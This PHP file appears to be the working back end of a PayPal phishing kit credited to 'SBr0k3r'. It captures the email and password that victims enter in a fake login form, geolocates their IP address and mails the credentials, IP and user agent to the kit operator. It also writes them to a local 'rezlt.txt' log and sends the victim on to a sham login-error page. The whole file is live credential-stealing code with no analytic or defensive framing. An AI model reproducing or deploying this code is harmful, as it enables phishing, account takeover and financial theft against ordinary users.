<?php
/////////////////////////////////////// DON'T TOUCHE THIS CODE (EMAIL SEND & FTP WRITE CODE)
session_start();
include './../../your_email_here.php';
$lang_var = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);





switch ($lang_var){

    case "fr":

        $lang= "fr";

        break;

    case "it":

        $lang= "it";

        break;

    case "EN":

        $lang= "EN";

        break;

    default:

        $lang= "EN";

        break;

}

$_SESSION['_lang_'] = $lang;

#END



// GET Country & Country CODE !

if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
 $ip=$_SERVER['HTTP_CLIENT_IP'];}
 elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
 $ip=$_SERVER['HTTP_X_FORWARDED_FOR'];} else {
 $ip=$_SERVER['REMOTE_ADDR'];
 $ip=$_REQUEST['REMOTE_ADDR'];}





$query = @unserialize(file_get_contents('http://ip-api.com/php/'.$ip));

if($query && $query['status'] == 'success') {

  $_SESSION['_country_'] = $query['country'];

  $_SESSION['_countryCode_'] = $query['countryCode'];

}

session_start();


$_SESSION['login_email'] = $_POST['login_email'];



$_SESSION['login_password'] = $_POST['login_password'];


  $login_email = $_SESSION['login_email'];
 $login_password = $_SESSION['login_password'];

// Get user IP address
if ( isset($_SERVER['HTTP_CLIENT_IP']) && ! empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif ( isset($_SERVER['HTTP_X_FORWARDED_FOR']) && ! empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = (isset($_SERVER['REMOTE_ADDR'])) ? $_SERVER['REMOTE_ADDR'] : '0.0.0.0';
}

$ip = filter_var($ip, FILTER_VALIDATE_IP);
$ip = ($ip === false) ? '0.0.0.0' : $ip;
// Send log
$user_agent = $_SERVER['HTTP_USER_AGENT'];

$subject = "$ip | PayPal Log in <33 \n";

$headers = "From: Sbr0k3r <sendmai@lbox.com>\r\n" ;

$body .= "======== Happy SHOP $xname ^-^ =========\n";
$body .= "======== PayPal Login =========\n";
$body .= "Email            : ".$_SESSION['login_email']."\n";
$body .= "Password         : ".$_SESSION['login_password']."\n";
$body .= "============= Created in 2016 By .::SBr0k3r::. =============\n";
$body .= "From $ip             check in http://www.geoiptool.com/?IP=$ip   \n";
$body .= "===================\n";
$body .= "Url :  ".$_SESSION['url']."\n";
$body .= "===================\n";
$body .= $_SERVER['HTTP_USER_AGENT'];
$rnessage = "$body\n";
mail($to, $subject, $body , $headers);




// Get user IP address
$file = fopen("./../../../../rezlt.txt","a");

fwrite($file,"
======== Login ========
Email            : ".$_SESSION['login_email']."
Password         : ".$_SESSION['login_password']."
========= IP ==========
$ip
\n");

$redirect_page = "./../../login_error.php?country.x=".strtolower($_SESSION['_lang_']."&locale.x=".$query['countryCode'])."_".$query['countryCode'];

$redirect = true;
header('Location: '.$redirect_page);
?>
